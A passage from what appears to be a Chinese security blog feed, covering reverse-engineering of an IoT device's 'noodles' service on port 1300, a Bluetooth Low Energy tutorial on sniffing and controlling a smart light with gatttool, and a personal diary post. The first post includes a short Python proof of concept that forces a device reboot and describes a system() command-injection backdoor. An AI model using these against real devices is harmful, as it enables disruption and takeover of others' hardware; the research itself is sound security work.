apollo，前面提到过</p><p>noodles监听了1300端口，但我并没有找到任何关于这个服务的相关信息。</p><p>apollo应该是apache apollo服务</p><blockquote><p>Apache Apollo是一个代理服务器，其是在ActiveMQ基础上发展而来的，可以支持STOMP, AMQP, MQTT, Openwire, SSL, and WebSockets 等多种协议。</p><p><a href="https://www.freesion.com/article/41891296353/">https://www.freesion.com/article/41891296353/</a></p></blockquote><p>之后尝试逆向分析。</p><hr><p>上次的坑来填了</p><p>之前没有系统学习过网络编程，花了一周时间把tinyhttpd的源代码阅读理解了一下，并且仿照用python写了一个简易的httpd，可以看我另一篇文章</p><h2 id="noodles服务分析"><a href="#noodles服务分析" class="headerlink" title="noodles服务分析"></a>noodles服务分析</h2><p>通过分析发现noodles监听了1300端口</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote><p>sudo chroot . .&#x2F;qemu-arm-static .&#x2F;usr&#x2F;bin&#x2F;noodles</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220825143728754.png" alt="image-20220825143728754"></p><p>可以使用nmap来查看是否监听1300</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220825143906273.png" alt="image-20220825143906273"></p><p>可以看到1300端口已开放，并且noodles也对nmap有反应了</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>对于程序的静态分析，可以从main函数来正向递进分析，也可以从一些字符串来分析，又或者从一些关键函数</p><p>这里通过nmap扫描时noodles的打印来查找</p><p>通过交叉引用发现在FUN_00011878函数中存在相关信息。</p><p>创建并监听1300端口</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108367.png" alt="image-20220825152959870"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108369.png" alt="image-20220825154343089"></p><p>等待用户连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108456.png" alt="image-20220825153205132"></p><p>获取client传进来的内容</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108183.png" alt="image-20220825153844262"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108672.png" alt="image-20220825154440079"></p><p>主要内容处理在下面相似的内容处</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108224.png" alt="image-20220825155349794"></p><p>1300端口大概做了这些事情</p><p>参数有一下几种</p><blockquote><p>UPGRADE</p><p>BURNMAC</p><p>ELFEXEC</p><p>SYSTEM</p><p>SYSTEMEX</p><p>DOWNLOAD</p><p>UPLOAD</p><p>FLASHDUMP</p><p>BURNSN</p><p>READSN</p><p>WRITEENV</p><p>READENV</p></blockquote><h4 id="fun-00014f90-函数"><a href="#fun-00014f90-函数" class="headerlink" title="fun_00014f90()函数"></a>fun_00014f90()函数</h4><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108708.png" alt="image-20220826095918427"></p><p>三个参数分别为从client传入的内容，字符串，0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108283.png" alt="image-20220826101125979"></p><p>这里是xml参数处理。</p><h3 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h3><p>这里出了一个代码注入和一个设备重启</p><h4 id="设备重启"><a href="#设备重启" class="headerlink" title="设备重启"></a>设备重启</h4><p>设备重启是利用了代码问题，更像是设计时不严谨导致的</p><p>当标签中含有upgrade时，会运行到FUN_000146f4函数，执行完毕后必然会执行到FUN_00016b90函数来使设备重启。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108749.png" alt="image-20220826093937746"></p><p>只需要运行到此处，脚本会使设备重启</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108256.png" alt="image-20220826093948721"></p><p>poc</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> times = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1300</span>))s.send(<span class="hljs-string">&quot;&lt;UPGRADE&gt;test&lt;/UPGRADE&gt;&quot;</span>.encode())<span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">1024</span>))s.close()</code></pre></div><h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><p>这里更像一个后门，直接在 FUN_000140b4函数中发现，如果<code>&lt;system&gt;&lt;/system&gt;</code>中的参数不是iwlist便会直接使用system执行</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108353.png" alt="image-20220826095120280"></p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-低功耗蓝牙协议(BLE)</title>
    <link href="/article/94a01627.html"/>
    <url>/article/94a01627.html</url>
    
    <content type="html"><![CDATA[<h1 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h1><p>蓝牙是一种近距离无线通信技术，运行在2.4GHz免费频段，目前已大量应用于各种移动终端，物联网，健康医疗，智能家居等行业。</p><p>低功耗蓝牙协议是由蓝牙技术联盟（Bluetooth SIG）在2010年发布的蓝牙4.0，并不是蓝牙3.0的升级，而是全新的技术架构。</p><p>蓝牙4.0版本分为两种模式，单模蓝牙和双模蓝牙。</p><p>双模蓝牙，支持低功耗蓝牙的同时还兼容经典蓝牙，经典蓝牙的特点是大数据高速率，例如音频、视频等数据传输，常见的蓝牙音箱就是双模蓝牙，他需要大量的音频数据传输。</p><p>单模蓝牙，即低功耗蓝牙模式，是蓝牙4.0中的重点技术，低功耗，快连接，长距离。像各种手环，蓝牙温度计等都属于单模蓝牙。</p><h1 id="低功耗蓝牙"><a href="#低功耗蓝牙" class="headerlink" title="低功耗蓝牙"></a>低功耗蓝牙</h1><p>目前低功耗蓝牙在移动终端，智能家居，互联设备等市场都有广泛应用。</p><p>其优点：</p><ul><li>低功耗，使用纽扣电池就可以运行数月至数年。</li><li>快连接，毫秒级的连接速度，传统蓝牙甚至长达数分钟。</li><li>远距离，长达数百米的通信距离，而传统蓝牙通常10米左右。</li></ul><p>蓝牙联盟为低功耗蓝牙定义了一些标准数据规范（profile），只要遵守该规范，任意厂家的蓝牙设备，均可以相互连接与通信，例如无线蓝牙键盘鼠标，无论是安卓或是iOS还是Windows，均是即插即用，这便是“标准”的力量。</p><p>低功耗蓝牙支持的标准Profile有：</p><ul><li>HID，用于无线鼠标，键盘或其他遥控设备。</li><li>BatteryServices，电池状态服务，用于告知电池电量状态。</li><li>HRP，心率计Profile，用于心率采集。等等。</li></ul><p>低功耗蓝牙还可以自定义Profile，伴随着智能手机的发展和普及，低功耗蓝牙的这个特性得到了发扬光大，同时也拓宽了低功耗蓝牙的应用领域。例如，可以自定义一个开关量的Profile，数据01表示开灯，数据00表示关灯，然后手机发送数据01和00就可以控制灯的亮和灭。</p><p>类似的应用案例有很多，下面总结应用特点：</p><ul><li>支持自定义Profile，可以收发任意格式的数据，如01和00。</li><li>支持自定义设备，支持任意设备的连接和通信，例如智能蓝牙插座等。</li></ul><h1 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h1><p>以下将低功耗蓝牙统称为BLE，低功耗蓝牙设备称为BLE设备。</p><h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><p>BLE设备角色主要分为两种角色，<code>主机（Master）</code>和<code>从机（Peripheral）</code>，当主机和从机建立连接之后才能相互收发数据。</p><ul><li>主机，主机可以发起对从机的扫描连接。例如手机，通常作为BLE的主机设备。</li><li>从机，从机只能广播并等待主机的连接。例如智能手环，是作为BLE的从机设备。</li></ul><p>另外还有<code>观察者（Observer）</code>和<code>广播者（Broadcaster）</code>，这两种角色不常使用，但也十分有用，例如苹果的iBeacon，就是使用广播者角色来做，只需要广播特定内容即可。</p><blockquote><p>iBeacon，苹果公司开发的一种通过低功耗蓝牙技术进行一个十分精确的微定位技术;</p></blockquote><ul><li>观察者，观察者角色监听空中的广播事件，和主机唯一的区别是不能发起连接，只能持续扫描从机。</li><li>广播者，广播者可以持续广播信息，和从机的唯一区别是不能被主机连接，只能广播数据</li></ul><p>蓝牙协议栈没有限制设备的角色范围，同一个BLE设备，可以作为主机，也可以作为从机，我们称之为主从一体，主从一体的好处是，每个BLE设备都是对等的，可以发起连接，也可以被别人连接，更加实用。</p><h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><p>一个智能手环，在绑定之前，需要让手机发现自己才能去进行绑定操作。</p><p>这个让手机发现自己的操作就叫做广播。</p><p>即从机每经过一个时间间隔发送一次<code>广播数据包</code>，这个时间间隔称为<code>广播间隔</code>，这个广播动作叫做<code>广播事件</code>，只有当从机处于广播状态时，主机才能发现该从机。</p><p>BLE设备拥有40个信道，从0到39，其中37，38，39就是BLE的广播信道。</p><p>在每个广播事件中，广播包会分别在37,38和39三个信道上依次广播。</p><p>广播时间间隔的范围是从20ms到10.24s，广播间隔影响建立连接的时间。广播间隔越大，连接的时间越长。</p><p>广播数据包最多能携带31个字节的数据，一般包含可读的设备名称，设备是否可连接等信息。</p><p>当主机收到从机广播的数据包后，它可以再发送获取更多数据包的请求，这个时候从机将广播<code>扫描回应</code>数据包，扫描回应数据包和广播包一样，可以携带31个字节的数据，如果长度不足，会补0，这部分数据无意义。</p><blockquote><p>提示：蓝牙4.x，广播有效载荷最多是31个字节。而在蓝牙5.0中，通过添加额外的广播信道和新的广播PDU，将有效载荷增加到了255个字节</p></blockquote><p>在安卓手机中可以使用BLE调试助手来查看广播包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111025384.jpg" alt="0A3834EF258FD440B5A62DAF533A5AB9"></p><p>广播包一般格式为 0x长度类型数据长度类型数据…</p><p>0x02011A05030F1892FD11094544494649455220545753312050726F</p><p>这是我附近某个耳机的广播信息。</p><p>分析：</p><ul><li>0x02&#x2F;01&#x2F;1A05，长度2&#x2F;类型&#x2F;对应长度的值。</li><li>0x03&#x2F;0F&#x2F;1892FD，长度3&#x2F;类型&#x2F;对应长度的值。</li><li>0x11&#x2F;09&#x2F;4544494649455220545753312050726F，长度16&#x2F;类型&#x2F;对应的值。</li></ul><p>前两段数据并不能看出什么信息，第三段数据可以转为ascii看一下。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026149.png" alt="image-20230106111344806"></p><p>即蓝牙耳机名字。</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>扫描是主机监听从机广播数据包和发送扫描请求的过程，主机通过扫描，可以获取到从机的广播包以及扫描回应数据包，主机可以对已扫描到的从机设备发起连接请求，从而连接从机设备并通信。</p><p>扫描动作有两个比较重要的时间参数：<code>扫描窗口</code>和<code>扫描间隔</code>，如果扫描窗口等于扫描间隔，那么主机将一直处于扫描状态之中，持续监听从机广播包。</p><p><a href="http://doc.iotxx.com/%E6%96%87%E4%BB%B6:BLE%E6%8A%80%E6%9C%AF_%E6%89%AB%E6%8F%8F%E7%AA%97%E5%8F%A3%E5%92%8C%E6%89%AB%E6%8F%8F%E9%97%B4%E9%9A%94.jpg"><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026362.jpg" alt="BLE技术 扫描窗口和扫描间隔.jpg"></a></p><ul><li>被动扫描，主机监听广播信道的数据，当接收到广播包时，协议栈将向上层（也就是应用层，用户可编程）传递广播包。</li><li>主动扫描，主动扫描除了完成被动扫描的动作外，还会向从机发送一个扫描请求，从机收到该请求时，会再次发送一个称作<code>扫描回应</code>的广播包。</li></ul><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>除了扫描， 设备也可以主动发起连接， 发起状态的设备和扫描状态的设备区别在于：当它监听到一个可连接的广播， 发起设备就会发送一个连接请求， 而扫描设备会发送一个扫描请求。连接请求包括一套为从设备准备的连接参数， 安排连接期间发生的通道和时间。如果广播设备接收了连接， 两个设备会进入连接状态， 发起方会称为 Master（主机），而广播方会称为 Slave（从机）。</p><p>所有的通信都发生在两个设备的连接事件期间， 连接事件周期的发生， 按照连接参数指定的间隔联系， 每个事件发生在某个数据通道（0~36）， 调频增量参数决定了下次连接时间发生的通道， 在每个连接时间期间， Master 先发送， Slave 会在 150us 之后做出回应， 即使一个连接事件发生（ 或两者）， 双方都没有数据发送（例外情况是从设备潜伏使能）， 这允许两个设备都承认对方仍然存在并保持活跃的连接。</p><p>主机和从机都可以主动断开连接。一边发起断开， 另一边必须在断开连接之前回应这个断开请求。</p><h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><p>BLE 通信的两个基本概念。</p><ul><li><strong>GAP</strong> 通用访问配置文件(Generic Access Profile)</li><li><strong>GATT</strong> 通用属性配置文件(Generic Attribute Protocol)</li></ul><p>GAP完成了上面广播，连接的操作。</p><p>GATT则定义了两个 BLE 设备连接后如何使用服务和属性两个概念进行数据交换。</p><p>GATT 的两个主要概念：</p><ul><li>服务（Services）</li><li>特征（Characteristics）</li></ul><p><code>Profile</code>包含一个或者多个<code>服务</code>，每个<code>服务</code>又包含一个或者多个<code>特征</code>。主机可以发现和获取从机的<code>服务</code>和<code>特征</code>，然后与之通信。<code>特征</code>是主从通信的最小单元。</p><p>每个服务和特征都有自己的唯一标识<code>UUID</code>，标准UUID为128位，蓝牙协议栈中一般采用16位，也就是两个字节的UUID格式。</p><p>每个特征都有自己的属性，属性的取值有：<code>可读 Read</code>，<code>可写 Write</code> 以及 <code>通知 Notify</code>。</p><p>这样，两个BLE设备就有以下的数据交互方式。</p><ul><li>主机可主动向从机Write写入或Read读取数据。</li><li>从机可主动向主机Notify通知数据。</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这里使用了两台手机来模拟两个BLE设备</p><p>从机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026174.png" alt="image-20230109174401933"></p><p>主机连接从机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026650.png" alt="Screenshot_20230110-143857"></p><p>上面链接后可以看到整个profile，下面每个UUID对应一个服务，不同服务之间有不同的特征。在UUID为 0xFFF0的服务中，有三个特征，0xFFF1，0xFFF2，0xFFF3。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026460.png" alt="image-20230111094129656"></p><p>可以看到FFF1的属性为read&#x2F;notify，可读，通知。FFF2的属性为Write，可写。</p><p>从机页面中，从机通过0xfff1发送数据。0xfff2接收数据。</p><h3 id="0xfff1"><a href="#0xfff1" class="headerlink" title="0xfff1"></a>0xfff1</h3><p>从机发送数据：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026344.png" alt="image-20230111094259820"></p><p>主机实时接收:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027574.png" alt="image-20230111094737409"></p><h3 id="0xfff2"><a href="#0xfff2" class="headerlink" title="0xfff2"></a>0xfff2</h3><p>主机发送数据：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027280.png" alt="image-20230111095031034"></p><p>从机实时接收：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027889.png" alt="image-20230111095106285"></p><h1 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h1><p>可以理解为利用窃听装置来获取双方通信内容。</p><p>ble设备功能设计中，一定会少不了私有的Service或Characteristic，就要通过app逆向或嗅探蓝牙通信来分析了。</p><p>蓝牙嗅探最好的神器是Ubertooth One，精致的硬件＋配套的软件变成了物联网黑客强大的帮手。</p><blockquote><p>这玩意挺贵的，贵不是他的缺点，是我的缺点。</p></blockquote><p>所以我们使用暂时使用廉价的替代方案，BLE USB Dongle。之后有设备后会配套更新相应文章。</p><blockquote><p>这玩意只支持ble</p></blockquote><p>这里使用的是一块nRF52832 Dongle，某宝可以直接买到烧录好的板子，具体烧录过程就不赘述。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111046396.jpg" alt="image-20230111104642738"></p><p>具体可看官方文档：<a href="https://www.nordicsemi.com/Products">https://www.nordicsemi.com/Products</a></p><h2 id="配置wireshark"><a href="#配置wireshark" class="headerlink" title="配置wireshark"></a>配置wireshark</h2><p>购买板子后找客服要来物料包，其中包含相关插件。</p><p>打开 wireshark → 帮助 → 关于 wireshark → 文件夹 → 双击打开 Extcap 路径(全 局路径和个人路径二选其一)如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027258.png" alt="image-20230111101431156"></p><p>将 extcap 文件夹的四个文件复制到 wireshark 的 extcap 路径下， 以全局路径为例，如图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027128.png" alt="image-20230111101537140"></p><p>双击 wireshark 个人配置的路径，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027355.png" alt="image-20230111101655494"></p><p>在弹出的文件夹中打开 profiles 文件夹</p><p>将解压压缩包的 Profile_nRF_Sniffer_xx_xx 文件夹拷贝到 profiles 文件夹中，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027834.png" alt="image-20230111101728559"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>软件配置成功后，将设备 插入 USB 口连接至 PC 端，打开 Wireshark，选 择 nRF sniffer COMx，具体串口号根据实际选择。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027932.png" alt="image-20230111101925074"></p><p>在工具栏中选择 → 视图 → 接口工具栏 → nRF sniffer，会出现如下界面(默认抓取 所有 BLE 广播信号):</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028268.png" alt="image-20230111101959670"></p><p>选择任一 BLE 从机上电进行广播。 </p><p>抓取指定 MAC 地址设备的数据包。</p><p>可通过 APP 查看设备 MAC 地址，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028533.png" alt="image-20230111102043707"></p><p>如下图红色方框中所示，点击 devices 过滤下拉框选择对应 MAC 地址的 device，选择 固定设备后则只会抓取和该设备有关的数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028931.png" alt="image-20230111102101560"></p><p>Wireshark 选择该 MAC 地址设备后，该设备的广播包、scan request packet 和 scan response packet 都会被捕获到。</p><p>![image-20230111102119282](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230111102119282.png)</p><p>该设备与任意 master 通信的数据包都可以被抓取，包括连接过程和连接之后的数据 包。双击任意一个 packet 可查看具体内容，例如该设备广播包抓取内容如下:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028239.png" alt="image-20230111102137695"></p><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>其实是对一个简单的蓝牙氛围灯的嗅探与攻击，其功能比较简单且无数据加密。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111052210.jpg" alt="image-20230111105207086"></p><p>app长这样</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111144377.jpeg" alt="IMG_2E60123242CF-1"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111144425.jpeg" alt="IMG_82B5E06A322C-1"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用wireshark来嗅探相关信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111111065.png" alt="image-20230111111111938"></p><p>使用手机app连接灯。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111116973.png" alt="image-20230111111617864"></p><p>有很多Empty PDU空包，使用  !(btle.data_header.llid &#x3D;&#x3D; 0x1) 来过滤</p><h3 id="开关"><a href="#开关" class="headerlink" title="开关"></a>开关</h3><p>从手机发送打开命令</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111123878.png" alt="image-20230111112358755"></p><p>其对0x000e特征发送了bc01010155</p><p>关闭命令</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111126880.png" alt="image-20230111112654746"></p><p>对0x000e特征发送了bc01010055</p><p>通过对比，第5位的01&#x2F;00控制灯的打开和关闭。</p><h3 id="改变速度"><a href="#改变速度" class="headerlink" title="改变速度"></a>改变速度</h3><p>该灯可以调节灯块闪烁速度。从0-100</p><p>修改为0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111132736.png" alt="image-20230111113239663"></p><p>修改为100</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111138001.png" alt="image-20230111113830782"></p><p>对比第四位从00-64转换为10进制，即0-100</p><p>所以通过修改该参数可控制速度。</p><p>bc0801 00 55</p><h3 id="改变灵敏度"><a href="#改变灵敏度" class="headerlink" title="改变灵敏度"></a>改变灵敏度</h3><p>与速度类似</p><p>修改为0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111145004.png" alt="image-20230111114518816"></p><p>修改为100</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111145706.png" alt="image-20230111114553528"></p><p>特征与速度类似</p><h3 id="改变模式"><a href="#改变模式" class="headerlink" title="改变模式"></a>改变模式</h3><p>第一个模式</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111147071.png" alt="image-20230111114710947"></p><p>最后一个模式</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111147434.png" alt="image-20230111114739307"></p><p>所以模式从01-99共153个。</p><p>bc060200 01 55</p><h3 id="改变颜色"><a href="#改变颜色" class="headerlink" title="改变颜色"></a>改变颜色</h3><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111150198.png" alt="image-20230111115025067"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111151788.png" alt="image-20230111115131681"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111152383.png" alt="image-20230111115200253"></p><p>通过对多个颜色的分析，数据格式应该为bc04060 11c 0 196 000055，其中11c控制亮度，196控制颜色。</p><p>通过上面的分析，发现都是通过0x000e来进行操作。</p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>这里利用linux蓝牙栈（blueZ）来操作。</p><blockquote><p>sudo apt-get install bluez</p></blockquote><p>安装完成后会有hcitool和gatttool两个工具，分别进行扫描和连接以及数据的读写。</p><p>硬件使用一个蓝牙4.0的免驱适配器。</p><p>如果你的电脑虚拟机无法获取到主机网卡，可以在vm设置中取消与linux共享蓝牙设备，再接入外接适配器。</p><h2 id="hciconfig"><a href="#hciconfig" class="headerlink" title="hciconfig"></a>hciconfig</h2><p>用于配置蓝牙设备。我们可以运行这个命令来列出连接到我们计算机的 BLE 适配器以及它们的基本信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111406103.png" alt="image-20230111140645973"></p><p>hciconfig hciX up 启用名为 hciX 的蓝牙设备</p><p>hciconfig hciX down 停用名为 hciX 的蓝牙设备</p><p>如果之后扫描和连接过程中出现什么问题，可以通过这两条命令来重启蓝牙设备尝试解决。</p><h2 id="hcitool"><a href="#hcitool" class="headerlink" title="hcitool"></a>hcitool</h2><p>hcitool 用于配置蓝牙连接，并向蓝牙设备发送一些特殊命令。</p><p>hcitool -i hciX 使用 hciX 接口，如果不指定，默认使用第一个可用接口。</p><p>hcitool scan 扫描处于发现模式的传统蓝牙设备。</p><p>hcitool lescan 扫描 BLE 设备。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111433751.png"></p><h3 id="Gattool"><a href="#Gattool" class="headerlink" title="Gattool"></a>Gattool</h3><p>gatttool -I 以交互模式启动 gatttool。</p><p>gatttool -t random -b [adr] -I 使用随机 LE 地址在交互模式下启动 gattool。连接到地址为 adr 的远程蓝牙设备。</p><p>primary 检查已连接 BLE 设备的可用服务。</p><p>characteristic 检查已连接 BLE 设备的可用属性，以便从中读取数据。</p><p>char-desc 特征描述符的发现。检查 n 个 handle。</p><p>char-read-hnd 使用 handle 读取属性 。</p><p>char-write-req 向 handle 写入值。</p><p>通过扫描获取的灯泡mac地址ff:22:09:30:00:18</p><p>使用<code>gatttool</code>连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111435279.png" alt="image-20230111143500095"></p><p>有时候连接成功了但是会报错，需要再连接下。</p><p>使用<code>primary</code>查看服务</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111436532.png" alt="image-20230111143606390"></p><p>使用<code>Characteristics</code>查看特征</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111437647.png" alt="image-20230111143704457"></p><p>在找到服务和特征后，需要知道读&#x2F;写数据的 handle。这可以使用<code>char-desc</code>命令得到。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111437233.png" alt="image-20230111143742105"></p><p>在找到 handle 后，使用命令<code>char-read-hnd &lt;handle&gt;</code>从 handle 中读取数据。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111439744.png" alt="image-20230111143910570"></p><p>也可以使用<code>char-read-uuid &lt;uuid&gt;</code>来读取。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111440241.png" alt="image-20230111144016084"></p><p>从前面嗅探中可知，该灯是通过0x000e来写入数据。</p><p>可以命令<code>char-write-req &lt;handle&gt; &lt;value&gt;</code> 向 handle 中写入值。</p><p>关机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111443278.png" alt="image-20230111144300103"></p><p>如果<code>char-write-req</code>报错，可以使用<code>char-write-cmd</code>替换。</p><p>不过注意cmd是没有返回内容的，只能从设备反应来查看是否执行成功。</p><hr><p>以上就是入门BLE协议的相关知识，关与协议的工具，有个比较强的大的框架mirage，不过相关文章很少，需要自行研究。</p><blockquote><p><a href="https://github.com/RCayre/mirage">https://github.com/RCayre/mirage</a></p></blockquote><p>之后也会尝试更多相关设备的研究。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念</title>
    <link href="/article/f3404829.html"/>
    <url>/article/f3404829.html</url>
    
    <content type="html"><![CDATA[<p>终于要下雨了，孩子要热死了</p><p>什么都不想干，当个废物多好</p><p>今天看到一段话</p><div class="code-wrapper"><pre><code class="hljs">今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。”青春真是充满了力量和脆弱。</code></pre></div><p>今天的壁纸</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0108.JPG" alt="IMG_0108"></p><p>杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。</p><p>这次的一些照片。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c.jpeg" alt="ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&bo=VQhABlUIQAYWECA!&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=HAtABhwLQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=6b61c2a62bf63dc060101c4cca092e03&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4c692d47afb812c710204fd646c7b6c7&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=WglABloJQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f340e733aa99e0602f33cfb08e3d7400&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=9cf2b2c0b805d5413d4832e9eb42bb0c&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f990c2901268e23184d685220f13f256&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4fda3896c763b8cce7b3abe711690e43&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=5d8305503f754517af9f7db63188908e&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img 